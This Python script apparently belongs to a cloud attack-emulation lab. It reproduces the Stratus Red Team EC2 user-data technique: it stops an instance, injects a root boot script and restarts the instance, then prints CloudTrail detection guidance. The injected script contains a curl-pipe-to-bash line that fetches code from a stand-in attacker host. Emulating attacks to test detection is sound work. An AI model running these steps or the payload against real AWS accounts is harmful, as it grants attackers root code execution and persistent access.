"""
Technique : aws.execution.ec2-user-data
Tactic    : Execution (T1059)
Source    : https://stratus-red-team.cloud/attack-techniques/AWS/aws.execution.ec2-user-data/

Pre-requisites:
  - Run `pulumi up` in ../infra/ first to create the target EC2 instance.

How the attack works:
  An attacker with ec2:StopInstances + ec2:ModifyInstanceAttribute +
  ec2:StartInstances can replace an EC2 instance's user-data script with a
  malicious shell script.  When the instance next boots (after being stopped
  and started), it executes the attacker's script as root, providing code
  execution and potentially establishing persistent C2 access.

Detection signal:
  - ec2:ModifyInstanceAttribute with Attribute=userData on a stopped instance.
  - ec2:StartInstances following a ModifyInstanceAttribute on the same instance.
  - Instance CloudWatch Logs showing unexpected script execution on startup.

Revert:
  - None (instance is left running with modified user-data; pulumi destroy cleans up).
"""

import sys
if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")  # type: ignore[union-attr]
if hasattr(sys.stderr, "reconfigure"):
    sys.stderr.reconfigure(encoding="utf-8", errors="replace")  # type: ignore[union-attr]

import base64
import json
import os
import subprocess
from pathlib import Path

import boto3
from botocore.exceptions import ClientError


# ── Config ────────────────────────────────────────────────────────────────────

MALICIOUS_USER_DATA = (
    b"#!/bin/bash\n"
    b"# Stratus Red Team - malicious user-data script\n"
    b"# In a real attack this would download and execute a C2 agent\n"
    b"curl -s http://attacker.example.com/payload | bash\n"
    b'echo "Compromised" > /tmp/pwned\n'
)


# ── Helpers ───────────────────────────────────────────────────────────────────

def get_pulumi_outputs(stack_dir: str) -> dict:
    result = subprocess.run(
        ["pulumi", "stack", "output", "--json", "--show-secrets"],
        cwd=stack_dir,
        capture_output=True,
        text=True,
        env={**os.environ, "PULUMI_CONFIG_PASSPHRASE": os.environ.get("PULUMI_CONFIG_PASSPHRASE", "")},
    )
    if result.returncode != 0:
        print(f"[!] pulumi stack output failed: {result.stderr.strip()}")
        return {}
    return json.loads(result.stdout)


def banner(msg: str) -> None:
    print(f"\n{'=' * 60}")
    print(f"  {msg}")
    print(f"{'=' * 60}")


def wait_until_state(ec2_client, instance_id: str, target_state: str, timeout_s: int = 120) -> None:
    print(f"  Waiting for {instance_id} to reach state: {target_state}...")
    waiter_map = {
        "stopped": ec2_client.get_waiter("instance_stopped"),
        "running": ec2_client.get_waiter("instance_running"),
    }
    waiter = waiter_map.get(target_state)
    if waiter:
        waiter.wait(InstanceIds=[instance_id], WaiterConfig={"Delay": 15, "MaxAttempts": timeout_s // 15})
        print(f"  [+] Instance is now: {target_state}")


# ── Main ──────────────────────────────────────────────────────────────────────

def main(session: "boto3.Session") -> None:
    stack_dir   = str(Path(__file__).parent.parent / "infra")
    infra       = get_pulumi_outputs(stack_dir)
    instance_id = infra.get("instance_id", "")

    if not instance_id:
        print("[!] instance_id not found in Pulumi outputs. Did you run `pulumi up`?")
        return

    ec2_client = session.client("ec2")

    # ── Step 1: Stop the instance ─────────────────────────────────────────────
    banner("Step 1 — Stop instance (StopInstances)")
    try:
        ec2_client.stop_instances(InstanceIds=[instance_id])
        print(f"  [+] Stop signal sent to: {instance_id}")
        print(f"  [!] CloudTrail event: ec2:StopInstances")
        wait_until_state(ec2_client, instance_id, "stopped")
    except ClientError as exc:
        print(f"  [!] StopInstances failed: {exc}")
        return

    # ── Step 2: Inject malicious user-data ────────────────────────────────────
    banner("Step 2 — Inject malicious user-data (ModifyInstanceAttribute)")
    encoded = base64.b64encode(MALICIOUS_USER_DATA).decode("utf-8")
    try:
        ec2_client.modify_instance_attribute(
            InstanceId=instance_id,
            UserData={"Value": encoded},
        )
        print(f"  [+] User-data replaced on: {instance_id}")
        print(f"  [+] Payload: {MALICIOUS_USER_DATA.decode()[:100].strip()}")
        print(f"  [!] CloudTrail event: ec2:ModifyInstanceAttribute (Attribute=userData)")
    except ClientError as exc:
        print(f"  [!] ModifyInstanceAttribute failed: {exc}")
        return

    # ── Step 3: Start the instance (triggers malicious script) ───────────────
    banner("Step 3 — Start instance — malicious script will run on boot (StartInstances)")
    try:
        ec2_client.start_instances(InstanceIds=[instance_id])
        print(f"  [+] Instance starting: {instance_id}")
        print(f"  [!] CloudTrail event: ec2:StartInstances")
        print(f"  [!] Malicious user-data script will execute as root on next boot.")
    except ClientError as exc:
        print(f"  [!] StartInstances failed: {exc}")

    banner("Complete")
    print("CloudTrail events: ec2:StopInstances, ec2:ModifyInstanceAttribute, ec2:StartInstances")
    print("\nDetection guidance:")
    print("  Alert on ec2:ModifyInstanceAttribute with Attribute=userData on any instance.")
    print("  Correlate with Stop+Start sequence on the same instance.")
    print("\nRun `pulumi destroy` in ../infra/ to remove the instance.")


if __name__ == "__main__":
    main(boto3.Session())


# ── MayaTrail Option-C entry point ─────────────────────────────────────────────

def _session_from_outputs(outputs: dict, region: str) -> boto3.Session:
    """Build a session from the worker-injected assumed-role creds (Option C);
    fall back to the ambient default session when run standalone."""
    creds = (outputs or {}).get("_aws_credentials")
    if creds:
        return boto3.Session(
            aws_access_key_id=creds.get("AWS_ACCESS_KEY_ID"),
            aws_secret_access_key=creds.get("AWS_SECRET_ACCESS_KEY"),
            aws_session_token=creds.get("AWS_SESSION_TOKEN"),
            region_name=region,
        )
    return boto3.Session(region_name=region)


def run(outputs: dict, region: str = "us-east-1") -> None:
    """Entry point called by the run_emulation_attack Celery task."""
    main(_session_from_outputs(outputs, region))
